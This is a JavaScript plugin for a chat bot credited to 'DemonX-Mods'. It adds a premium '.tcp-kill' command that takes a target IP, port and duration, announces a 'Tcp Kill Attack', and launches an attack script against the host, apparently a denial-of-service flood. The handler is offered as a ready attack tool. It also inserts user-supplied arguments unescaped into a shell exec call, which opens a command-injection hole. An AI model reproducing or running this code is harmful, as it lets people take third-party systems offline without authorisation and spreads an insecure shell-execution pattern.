const { exec } = require('child_process')

const handler = async (m, { args }) => {
    if (args.length < 3) {
        m.reply(`\`\`\`[🔍] .tcp-kill [ip] [duration] [port]\`\`\``)
        return;
    }

    const hostname = args[0];
    const duration = args[1];
    const port = args[2];

conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title:  global.title,
body: `This Action Will Make A Deadly Move`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: global.attacking,
sourceUrl: ``
}}, text: `\`Tcp Kill Attack\`
\`Host:\` ${hostname}
\`Port:\` ${port}
\`User:\` ${m.sender}
\`Duration:\` ${duration} Seconds
\`Creator:\` DemonX-Mods`}, {quoted: m})
    exec(`node ./lib/SkyranXMODS/RanXTcpkill.js ${hostname} ${duration} ${port}`);
}

handler.help = ['tcp-kill']
handler.tags = ['tools', 'attack'];
handler.premium = true
handler.command = /^(tcp-kill)$/i;
module.exports = handler
